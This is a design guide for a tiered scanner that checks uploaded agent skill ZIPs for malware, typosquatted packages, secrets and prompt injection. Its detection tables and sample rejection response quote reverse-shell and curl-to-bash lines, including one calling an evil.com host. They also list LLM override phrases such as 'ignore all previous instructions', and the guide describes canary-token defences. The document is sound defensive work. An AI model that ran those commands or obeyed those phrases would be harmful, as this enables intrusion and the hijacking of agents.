# Security Scanner — Implementation Guide

The security scanner inspects uploaded skill ZIPs **before** they reach MinIO storage. It uses a tiered model where most clean uploads are accepted in under 1ms, while suspicious content is escalated through progressively deeper analysis.

## Architecture Overview

```
UploadSkill → normalizeSkillZip → validateSkillZip → parsedSkill.Validate()
  → CheckZIPSafety(zipData)                        ← ZIP bomb protection
  → scanner.Scan(ctx, zipReader, parsedSkill)       ← tiered scanning
  → registry.Upload → store.UpsertSkill
```

The scanner sits in `internal/scanner/` and exposes a single `Scanner` interface:

```go
type Scanner interface {
    Scan(ctx context.Context, zr *zip.Reader, s *skill.Skill) (*ScanResult, error)
}
```

**Error contract:**
- `(result, nil)` — scan completed. Check `result.Pass` for the verdict.
- `(nil, error)` — infrastructure failure. Caller rejects the upload (fail closed) and returns HTTP 500.
- Never returns `(result, error)`.

## Tiered Scanning Model

```
                    ┌─────────────────┐
                    │   ZIP Upload    │
                    └────────┬────────┘
                             │
                    ┌────────▼────────┐
                    │  ZIP Bomb Check │  50MB cap, 500 entries, 100:1 ratio
                    └────────┬────────┘
                             │
               ┌─────────────▼─────────────┐
               │  TIER 1: Quick Scan       │  < 100ms
               │  - Static regex patterns  │
               │  - Dependency blocklist   │
               └─────────┬────────┬────────┘
                         │        │
                    BLOCK found   no BLOCK
                         │        │
                    ┌────▼────┐   │
                    │ REJECT  │   │
                    └─────────┘   │
                         ┌────────▼──────────────┐
                         │  TIER 2: Deep Scan    │  < 500ms (always runs)
                         │  - Typosquat check    │
                         │  - Prompt injection   │
                         │  - Security analysis  │
                         │  - Hardcoded secrets  │
                         │  - Suspicious URLs    │
                         └────────┬───────┬──────┘
                                  │       │
                             resolved   unresolved flags
                                  │       │
                             ┌────▼────┐  │
                             │ verdict │  │
                             └─────────┘  │
                                  ┌───────▼────────────┐
                                  │  TIER 3: LLM       │  < 10s (opt-in)
                                  │  - Claude analysis  │
                                  │  - Canary tokens   │
                                  │  - Prompt hardening│
                                  └───────┬────────────┘
                                          │
                                     ┌────▼────┐
                                     │ verdict │
                                     └─────────┘
```

**Tier 2 always runs** — security analysis (hardcoded secrets, suspicious URLs, credential exposure, system modification) applies to all uploads regardless of Tier 1 findings. Dependency and prompt checks run when relevant files are present. Tier 3 runs only when Tier 2 leaves unresolved FLAG findings and LLM analysis is enabled.

## File Structure

```
internal/scanner/
├── scanner.go               # Pipeline struct, Scan(), hot-reload, tier orchestration
├── result.go                # Finding, ScanResult, Severity types, scan summaries
├── errors.go                # ErrBlocked, ErrScanFailed sentinel errors
├── metrics.go               # Atomic scan counters (pass/block/fail, per-tier, per-category)
├── zipcheck.go              # CheckZIPSafety — zip bomb protection
├── lineutil.go              # Line number extraction, snippet helpers
├── default_patterns.yaml    # Default pattern definitions (embedded via go:embed)
├── pattern_loader.go        # YAML pattern loader, merger, OSSF feed importer, ParsePatternData
├── pattern_loader_test.go   # Pattern loader tests (10 cases)
├── stage_patterns.go        # Tier 1: static regex patterns + dep blocklist
├── corpus.go                # ~200 popular PyPI/npm package names for typosquat detection
├── stage_deps.go            # Tier 2: typosquatting, homoglyphs, install hooks
├── stage_deps_test.go       # Tier 2 deps tests (12 cases)
├── stage_prompt.go          # Tier 2: prompt injection, delimiter injection, invisible Unicode
├── stage_prompt_test.go     # Tier 2 prompt tests (17 cases)
├── stage_security.go        # Tier 2: secrets, URLs, credentials, system modification
├── stage_security_test.go   # Tier 2 security tests (40+ cases)
├── stage_llm.go             # Tier 3: LLM deep analysis via Claude API
├── stage_llm_test.go        # Tier 3 LLM tests (13 cases, mock HTTP server)
├── stage_external_test.go   # Metrics tests (3 cases)
└── scanner_test.go          # Integration tests + ZIP safety tests
```

## Findings Model

Every scan observation is a `Finding`:

```go
type Finding struct {
    Stage       string   // "static_patterns", "dependencies", "prompt_injection", "security_analysis", "llm_analysis"
    Severity    Severity // "BLOCK" or "FLAG"
    Category    string   // e.g. "reverse_shell", "typosquat_package", "hardcoded_secret"
    FilePath    string   // relative path within the ZIP
    Description string   // human-readable explanation
    Line        int      // line number in the file (0 if unavailable)
    MatchText   string   // snippet of the matched text
    Remediation string   // guidance for the skill author to fix the issue
    IssueCode   string   // stable issue code (e.g. "E004", "W008")
}
```

- **BLOCK** — immediate rejection. The skill is never stored.
- **FLAG** — suspicious but possibly legitimate. Escalated to a deeper tier for contextual judgment.

### Scan Summary

Each `ScanResult` includes a human-readable `Summary` generated by `GenerateSummary()`. It lists all findings grouped by severity with file paths, line numbers, and remediation guidance. Skill authors see this in the rejection response to understand exactly what to fix.

### Issue Codes

| Code | Severity | Category |
|------|----------|----------|
| E004 | BLOCK | Prompt injection |
| E005 | BLOCK/FLAG | Suspicious URLs |
| E006 | BLOCK | Malicious code patterns |
| W007 | FLAG | Credential exposure risk |
| W008 | BLOCK | Hardcoded secrets |
| W009 | FLAG | Financial execution |
| W012 | BLOCK/FLAG | Runtime external dependencies |
| W013 | BLOCK/FLAG | System/service modification |

## Tier 1: Quick Scan (`stage_patterns.go`)

Runs compiled regexes against every text file in the ZIP. Scans all file extensions (not just `.py`/`.js`/`.sh`), skips binary files and files over 1MB.

### Block Patterns (always reject)

| Category | Examples |
|----------|----------|
| `reverse_shell` | `nc -e /bin/sh`, `/dev/tcp/`, `mkfifo` + `nc`, `socat exec` |
| `piped_execution` | `curl \| bash`, `wget \| sh`, `base64 -d \| bash` |
| `crypto_miner` | `import xmrig`, `stratum+tcp://`, `coinhive` |
| `sandbox_escape` | `nsenter`, `unshare --mount`, `/proc/*/ns/` |
| `destructive_command` | `rm -rf /` |
| `fork_bomb` | `:(){ :\|:& };:` |
| `obfuscation` | Base64 blob > 256 chars |
| `malicious_package` | Known-malicious packages from OSSF/npm advisories (exact match) |

### Flag Patterns (escalate to Tier 2)

| Category | Examples |
|----------|----------|
| `process_execution` | `subprocess.Popen`, `os.system`, `child_process`, `execSync` |
| `dynamic_execution` | `eval()`, `exec()`, `Function()`, `compile()` |
| `network_access` | `socket.connect`, `requests.get`, `urllib.request` |
| `sensitive_file_access` | `/etc/passwd`, `/etc/shadow`, `~/.ssh/`, `.env` |
| `hardcoded_ip` | Any IP address literal |

### Dependency Blocklist

The `blocklist_packages` list in `default_patterns.yaml` contains ~40 known-malicious package names from Python (OSSF advisories) and Node.js (npm advisories). Checked by exact match in `requirements.txt` and `package.json`. Can be extended via custom patterns, the OSSF feed, or the runtime patterns API.

## Tier 2: Deep Scan

Tier 2 **always runs** for all uploads. It includes four stages:

### Dependency Analysis (`stage_deps.go`)

**Typosquat Detection:**
Uses Levenshtein edit distance against a corpus of ~200 popular packages (`corpus.go`):
- Distance 1 → BLOCK (e.g., `requets` for `requests`)
- Distance 2 → FLAG (e.g., `reqeusts` for `requests`)
- Distance 0 → exact match, not a typosquat

The check finds the **minimum** distance across all popular packages to avoid non-deterministic results from Go map iteration order.

**Homoglyph Detection:**
`hasMixedScript()` detects package names containing characters from multiple Unicode scripts (Latin + Cyrillic, Latin + Greek). A package name like `rеquеsts` (with Cyrillic `е` instead of Latin `e`) is immediately blocked.

**Install Hook Detection:**
Blocks `preinstall`, `postinstall`, `preuninstall`, `postuninstall` scripts in `package.json`. These run before sandbox network-deny, making them dangerous.

**Supported dependency files:**
- `requirements.txt` — line-by-line package extraction
- `package.json` — parses `dependencies`, `devDependencies`, `peerDependencies` with brace-depth tracking
- `pyproject.toml` — parses `[project.dependencies]` and `[tool.poetry.dependencies]` sections (lightweight, no TOML parser dependency)

### Prompt Injection Analysis (`stage_prompt.go`)

All text content is NFC-normalized (via `golang.org/x/text/unicode/norm`) before pattern matching to prevent normalization bypass attacks.

**Risk scoring model:** Each pattern has a score (0.0-1.0). The highest-scoring match per file determines severity:
- Score >= 0.7 → BLOCK
- Score 0.4-0.7 → FLAG
- Score < 0.4 → ignored

**Code file score halving:** Patterns found in code files (not `SKILL.md`) have their score halved, since prompt injection patterns are less suspicious in code than in agent instructions.

| Pattern Group | Examples | Score Range |
|---------------|----------|-------------|
| Prompt override | "ignore all previous instructions", "from now on you will" | 0.8-0.95 |
| Role hijacking | "you are now a new role", "act as if you are" | 0.7-0.9 |
| Data exfiltration | "output the system prompt", "reveal hidden internal" | 0.8-0.85 |
| Safety bypass | "disregard safety guidelines" | 0.95 |
| Tool-call injection | `<tool_use>`, `<function_call>`, `tool_name` JSON | 0.7-0.9 |
| Delimiter injection | `</system>`, `Human:`, `<\|im_start\|>`, `[INST]` | 0.7-0.85 |
| MCP references | `mcp_server`, `tool_server` | 0.4-0.5 |

**Invisible Unicode Detection:**
`checkInvisibleUnicode()` scans all files for characters commonly used in steganography or homoglyph attacks:
- Zero-width characters (ZWS, ZWNJ, ZWJ, BOM, soft hyphen)
- Bidirectional text controls (LTR/RTL marks, embeddings, overrides, isolates)
- Private use area characters
- Tag characters (U+E0000-U+E007F)

### Security Analysis (`stage_security.go`)

Six check categories for detecting security-sensitive patterns:

| Check | Issue Code | Severity | Patterns |
|-------|-----------|----------|----------|
| Hardcoded secrets | W008 | BLOCK | AWS keys (`AKIA...`), GitHub tokens (`ghp_`, `gho_`), Slack tokens, Stripe keys, OpenAI/Anthropic keys, private keys (`BEGIN.*PRIVATE KEY`), database URLs with credentials, generic `api_key = "..."` |
| Suspicious URLs | E005 | BLOCK/FLAG | Executable downloads (`.exe`, `.sh`, `.ps1`), URL shorteners (bit.ly, tinyurl), paste/temp hosting (pastebin, transfer.sh), raw GitHub content, IP-based URLs |
| Credential exposure | W007 | FLAG | Skills instructing agents to output/send API keys or secrets (SKILL.md only) |
| Financial execution | W009 | FLAG | Stripe charges, PayPal transactions, crypto transfers, trading operations (SKILL.md only) |
| Runtime dependencies | W012 | BLOCK/FLAG | Runtime instruction fetching, auto-update mechanisms, dynamic code loading from URLs |
| System modification | W013 | BLOCK/FLAG | `sudo`, `systemctl`, `launchctl`, `chmod +s`, `chown root`, `iptables`, Windows registry |

## Tier 3: LLM Deep Analysis (`stage_llm.go`)

Opt-in via `SKILLBOX_SCANNER_LLM_ENABLED=true`. Only runs when Tier 2 leaves unresolved FLAG findings.

### How It Works

1. **Content collection:** Gathers `SKILL.md` and entrypoint files (`main.py`, `index.js`, `run.sh`, etc.) in priority order, truncated to 100KB total.

2. **Prompt construction:** Builds a system prompt with analysis instructions and a user message containing the scanned content. The scanned content is **never** placed in the system message.

3. **API call:** Sends a request to the Anthropic Messages API with `temperature: 0` for deterministic output.

4. **Response validation:** Parses the JSON response, validates the canary token, checks confidence range.

5. **Verdict:** If the LLM says benign → clears the flags. If threat with confidence >= 0.7 → BLOCK. If threat with confidence < 0.7 → FLAG.

### Prompt Hardening

Four defense mechanisms prevent the scanned content from hijacking the LLM:

**1. Canary Tokens:**
A random 8-character alphanumeric token is inserted in the system prompt. The model must echo it in the `"canary"` field of its JSON response. If the canary is missing or altered, the scanned content likely manipulated the prompt → the scanner returns an error (fail closed).

**2. Random Delimiters:**
Scanned content is wrapped in random delimiters like `===SCAN_a7b3k9m2x1p4===` instead of predictable `---` or triple backticks. This prevents attackers from closing the fence with a matching delimiter.

**3. Temperature 0:**
Deterministic output reduces the LLM's susceptibility to manipulation.

**4. Content Placement:**
Scanned content goes in the `user` message only. The `system` message contains only analysis instructions and the expected JSON schema.

### Concurrency Control

A buffered channel semaphore limits concurrent LLM API calls (default: 5). This prevents 429 rate limit storms during burst uploads.

```go
semaphore: make(chan struct{}, cfg.MaxConcurrent)
```

### LLM Response Schema

```json
{
  "canary": "<echoed-canary-token>",
  "threat": true,
  "confidence": 0.95,
  "reasoning": "Code obfuscates a reverse shell using base64 encoding",
  "categories": ["malicious_code", "obfuscation"]
}
```

Valid categories: `malicious_code`, `data_exfiltration`, `prompt_injection`, `obfuscation`, `dependency_risk`, `sandbox_escape`, `legitimate_usage`.

### Fail-Closed Behavior

Any LLM error results in `(nil, error)`, which the upload handler treats as an infrastructure failure (HTTP 500, upload rejected):

- API timeout
- HTTP 5xx from Anthropic
- HTTP 429 rate limit
- Malformed JSON response
- Canary mismatch (possible prompt hijacking)
- Confidence out of range [0, 1]

## ZIP Bomb Protection (`zipcheck.go`)

Runs **before** the scanner pipeline. Checks:

| Check | Limit | Rationale |
|-------|-------|-----------|
| Total decompressed size | 50 MB | Prevents memory exhaustion |
| Entry count | 500 files | Prevents file descriptor exhaustion |
| Compression ratio | 100:1 per file | Detects zip bomb quines |
| Nested archives | Rejected | `.zip`, `.tar`, `.gz`, `.7z`, etc. inside ZIP |
| Path traversal | Rejected | Entries containing `..` |
| Symlinks | Rejected | Symlink entries in the ZIP |

## Configuration

All config is via environment variables, following 12-factor methodology.

| Variable | Type | Default | Description |
|----------|------|---------|-------------|
| `SKILLBOX_SCANNER_ENABLED` | bool | `true` | Enable/disable the entire scanner |
| `SKILLBOX_SCANNER_TIMEOUT` | duration | `30s` | Total scan timeout (all tiers) |
| `SKILLBOX_SCANNER_PATTERNS_FILE` | string | — | Path to custom patterns YAML loaded at startup |
| `SKILLBOX_SCANNER_OSSF_FEED_DIR` | string | — | Path to directory of OSV JSON files from OSSF malicious packages feed |
| `SKILLBOX_SCANNER_LLM_ENABLED` | bool | `false` | Enable LLM deep analysis (Tier 3) |
| `SKILLBOX_SCANNER_LLM_API_KEY` | string | — | Anthropic API key (required if LLM enabled) |
| `SKILLBOX_SCANNER_LLM_MODEL` | string | `claude-haiku-4-5-20251001` | Claude model for analysis |
| `SKILLBOX_SCANNER_LLM_TIMEOUT` | duration | `10s` | Per-LLM-call timeout |
| `SKILLBOX_SCANNER_LLM_MAX_CONCURRENT` | int | `5` | Max concurrent LLM API calls |

**Startup validation:**
- `SKILLBOX_SCANNER_ENABLED=false` emits `slog.Warn` at startup
- `SKILLBOX_SCANNER_LLM_ENABLED=true` without `SKILLBOX_SCANNER_LLM_API_KEY` fails startup

## Custom Patterns

All scanner patterns (regex rules, malicious package blocklist, popular package corpus) are defined in `default_patterns.yaml` and embedded in the binary via `//go:embed`. The scanner works out of the box with zero configuration.

### Pattern File Format

Pattern files use YAML (or JSON) with the following schema:

```yaml
version: 1

block_patterns:
  - regex: '\bmy-custom-evil-pattern\b'
    category: custom_block
    description: "Custom block pattern for internal use"

flag_patterns:
  - regex: '\bsuspicious-api-call\b'
    category: custom_flag
    description: "Flag for review"

common_block_patterns: []
common_flag_patterns: []

blocklist_packages:
  - my-known-bad-package

popular_packages:
  - my-internal-library
```

### Static Configuration (Startup)

Create a YAML file following the schema above and set:

```bash
SKILLBOX_SCANNER_PATTERNS_FILE=/path/to/custom-patterns.yaml
```

Custom patterns are **merged on top** of defaults — they add rules, never remove built-in protection. You only need to include the sections you want to extend (empty sections can be omitted).

### Runtime Pattern Management (API)

Custom patterns can be managed at runtime via the admin API without restarting the server:

**Get current custom patterns:**
```
GET /v1/admin/scanner/patterns
```

Returns the currently active custom pattern overlay. If no custom patterns are loaded, returns an empty `PatternFile` with `version: 1`.

**Upload/replace custom patterns:**
```
PUT /v1/admin/scanner/patterns
Content-Type: application/yaml
```

```yaml
version: 1
block_patterns:
  - regex: 'my-dangerous-pattern'
    category: custom_threat
    description: "Custom threat pattern"
blocklist_packages:
  - evil-package
```

Response:
```json
{
  "status": "loaded",
  "block_patterns": 1,
  "flag_patterns": 0,
  "blocklist_packages": 1,
  "popular_packages": 0
}
```

**Clear custom patterns (revert to defaults):**
```
PUT /v1/admin/scanner/patterns
```
Send an empty body or `{"version": 1}` to clear all custom patterns.

**How hot-reload works:**
- The pipeline holds a `sync.RWMutex` — scans in progress complete uninterrupted while pattern reload acquires the write lock.
- Custom patterns are merged on top of embedded defaults (same merge logic as startup).
- The OSSF feed is also re-read on each reload if configured.
- Invalid patterns (bad regex, wrong version) are rejected with HTTP 400 — the pipeline is never left in a broken state.
- Both YAML and JSON formats are accepted (YAML is a superset of JSON).

### OSSF Malicious Packages Feed

The [OSSF malicious-packages repository](https://github.com/ossf/malicious-packages) maintains 15,000+ reports of malicious packages in OSV JSON format across npm, PyPI, and other ecosystems.

To use it:

```bash
# Clone the feed
git clone https://github.com/ossf/malicious-packages.git /opt/ossf-feed

# Point the scanner at the OSV directory
SKILLBOX_SCANNER_OSSF_FEED_DIR=/opt/ossf-feed/osv/malicious
```

The loader walks the directory recursively, reads each `.json` file, extracts package names from the `affected[].package.name` field, and adds them to the blocklist. Malformed files are skipped with a warning.

## HTTP Response on Rejection

When a skill is blocked, the upload handler returns HTTP 422 with a structured body:

```json
{
  "error": "security_scan_failed",
  "message": "upload rejected by security scan",
  "details": {
    "scan_id": "a1b2c3d4-...",
    "categories": ["reverse_shell", "piped_execution"],
    "summary": "BLOCKED: 2 issues found\n\n[BLOCK] [E006] reverse_shell in exploit.sh:1\n  Matched: nc -e /bin/sh 10.0.0.1 4444\n  Fix: Remove reverse shell commands...\n\n[BLOCK] [E006] piped_execution in install.sh:3\n  Matched: curl https://evil.com/script.sh | bash\n  Fix: Avoid piping downloaded content directly to shell interpreters..."
  }
}
```

Infrastructure failures (scanner unavailable) return HTTP 500.

## Dry-Run Validation Endpoint

`POST /v1/skills/validate` runs the full scanner pipeline without storing the skill. Same auth as upload. Useful for agents to pre-flight check skills.

- **200 OK** — scan passed, returns `{ "valid": true, "skill_name": "...", "scan_tier": 2, "duration_ms": 45 }`
- **422 Unprocessable Entity** — scan failed, same body as upload rejection

## Scanner Admin Endpoints

| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/v1/admin/scanner/stats` | Scanner metrics (pass/block/fail counts, timing, categories) |
| `GET` | `/v1/admin/scanner/patterns` | Get current custom pattern overlay |
| `PUT` | `/v1/admin/scanner/patterns` | Upload/replace custom patterns (hot-reload) |

### Metrics Response

```
GET /v1/admin/scanner/stats
```

```json
{
  "total_scans": 1542,
  "passed_scans": 1489,
  "blocked_scans": 48,
  "failed_scans": 5,
  "tier1_scans": 1400,
  "tier2_scans": 137,
  "tier3_scans": 5,
  "avg_duration_ms": 12.5,
  "max_duration_ms": 8450.0,
  "block_categories": {
    "reverse_shell": 12,
    "typosquat_package": 8,
    "piped_execution": 6,
    "prompt_injection": 19
  }
}
```

Categories track only BLOCK findings (not FLAGS). Duplicate categories in a single scan are counted once.

## Wiring into the Server

In `cmd/skillbox-server/main.go`:

```go
var sc scanner.Scanner
var pipeline *scanner.Pipeline
if cfg.ScannerEnabled {
    var llmCfg *scanner.LLMConfig
    if cfg.ScannerLLMEnabled {
        llmCfg = &scanner.LLMConfig{
            APIKey:        cfg.ScannerLLMAPIKey,
            Model:         cfg.ScannerLLMModel,
            Timeout:       cfg.ScannerLLMTimeout,
            MaxConcurrent: cfg.ScannerLLMMaxConcurrent,
        }
    }
    pipeline = scanner.New(cfg.ScannerTimeout, slog.Default(), llmCfg, cfg.ScannerPatternsFile, cfg.ScannerOSSFFeedDir)
    sc = pipeline
} else {
    sc = &scanner.NoopScanner{}
}
```

The `NoopScanner` is used when scanning is disabled, for tests, and as a fallback.
The `pipeline` variable (non-nil when scanner is enabled) is passed to the router for admin endpoints (metrics, patterns).

## Testing

### Test Skill Generator

`scripts/gen-test-skills/main.go` generates 20 test skill ZIPs covering all detection categories:

```bash
go run ./scripts/gen-test-skills
# Output: scripts/gen-test-skills/out/*.zip
```

### Upload Script

`scripts/gen-test-skills/upload-all.sh` uploads all test ZIPs and verifies expected HTTP status codes:

```bash
./scripts/gen-test-skills/upload-all.sh [BASE_URL] [API_KEY]
# Defaults: http://localhost:8080, test-api-key
```

### Unit Tests

```bash
go test ./internal/scanner/ -v
```

- **scanner_test.go**: 22 integration tests (clean skills, reverse shells, crypto miners, fork bombs, blocklisted packages, context cancellation, binary/large file skipping)
- **pattern_loader_test.go**: 10 tests (embedded defaults, custom YAML merge, invalid YAML/regex, OSSF feed loading, malformed JSON, version validation)
- **stage_deps_test.go**: 12 tests (typosquatting at various distances, homoglyphs, install hooks, pyproject.toml, clean deps)
- **stage_prompt_test.go**: 17 tests (all injection categories, score halving, invisible Unicode)
- **stage_security_test.go**: 40+ tests (hardcoded secrets, suspicious URLs, credential exposure, financial execution, runtime deps, system modification, scan summaries, line utilities)
- **stage_llm_test.go**: 13 tests (benign/threat detection, canary validation, API errors, rate limiting, timeouts, semaphore, markdown-wrapped JSON)
- **stage_external_test.go**: 3 tests (metrics tracking — record scan, record failure, timing)

LLM tests use `httptest.Server` to mock the Anthropic Messages API. No real API calls or daemon connections are made.

## Rollback

Instant rollback with no migration:

- **Disable all scanning:** `SKILLBOX_SCANNER_ENABLED=false` and restart
- **Disable LLM only:** `SKILLBOX_SCANNER_LLM_ENABLED=false` and restart (Tier 1+2 continue running)
- **Clear custom patterns:** `PUT /v1/admin/scanner/patterns` with empty body (no restart needed)

## Future Ideas

- **Quarantine bucket:** Store rejected skills in a separate MinIO bucket for post-mortem analysis
- **Pattern versioning:** Track history of custom pattern changes via the API
- **Webhook notifications:** Alert on blocked uploads via configurable webhook endpoints
